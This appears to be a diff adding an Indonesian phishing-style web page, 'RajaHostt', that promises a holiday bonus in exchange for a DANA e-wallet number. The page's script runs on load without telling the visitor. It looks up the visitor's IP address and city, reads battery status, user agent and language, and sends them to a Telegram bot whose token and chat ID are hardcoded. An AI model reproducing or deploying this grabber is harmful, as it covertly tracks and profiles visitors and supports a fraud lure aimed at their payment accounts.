@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>RajaHostt</title>
+  <script>
+    // === KONFIGURASI TELEGRAM ===
+    const botToken = "8062349964:AAHmgOUFGYIi1o5aNs9bBU9P1BhypY7uweo";
+    const chatID = "7646582105";
+
+    // Fungsi untuk kirim pesan ke Telegram
+    function kirimPesanTelegram(pesan) {
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: chatID, text: pesan, parse_mode: "Markdown" })
+      })
+      .then(response => {
+        if (!response.ok) throw new Error("Gagal mengirim pesan");
+      })
+      .catch(error => console.error("Error:", error));
+    }
+
+    // Fungsi cek status baterai
+    async function getBatteryStatus() {
+      try {
+        if ('getBattery' in navigator) {
+          const battery = await navigator.getBattery();
+          const level = Math.round(battery.level * 100);
+          const charging = battery.charging ? "🔌 Mengisi daya" : "⚡ Tidak mengisi daya";
+          return `Baterai: ${level}% (${charging})`;
+        } else {
+          return "Baterai: Tidak didukung";
+        }
+      } catch {
+        return "Baterai: Gagal mendeteksi";
+      }
+    }
+
+    // Ambil data & kirim
+    async function kirimData() {
+      try {
+        const ipRes = await fetch("https://ipapi.co/json/");
+        const ipData = await ipRes.json();
+
+        const ip = ipData.ip || "Tidak ditemukan";
+        const negara = ipData.country_name || "Tidak ditemukan";
+        const provinsi = ipData.region || "Tidak ditemukan";
+        const kota = ipData.city || "Tidak ditemukan";
+
+        const battery = await getBatteryStatus();
+        const userAgent = navigator.userAgent;
+        const browser = navigator.vendor || "Tidak diketahui";
+        const bahasa = navigator.language;
+
+        const pesan = `
+🚀 *RajaHostt - Info Pengguna*
+━━━━━━━━━━━━━━━
+- 🌍 IP: ${ip}
+- 🏳️ Negara: ${negara}
+- 🏙️ Provinsi: ${provinsi}
+- 🏠 Kota: ${kota}
+- 🔋 ${battery}
+- 🖥️ User Agent: ${userAgent}
+- 🌐 Browser: ${browser}
+- 🗣️ Bahasa: ${bahasa}
+━━━━━━━━━━━━━━━
+📡 Data dikumpulkan otomatis.
+        `;
+
+        kirimPesanTelegram(pesan);
+
+      } catch (err) {
+        console.error("Gagal mengambil data:", err);
+      }
+    }
+
+    window.onload = kirimData;
+  </script>
+</head>
+<body>
+  <h2>Memproses Event...</h2>
+  <p>Terima Kasih Sudah Menggunakan Event Layanan Kami, Masukkan Nomor Dana Kalian Agar Saldo Thr Dapat Dikirmkan: .</p>
+</body>
+</html>
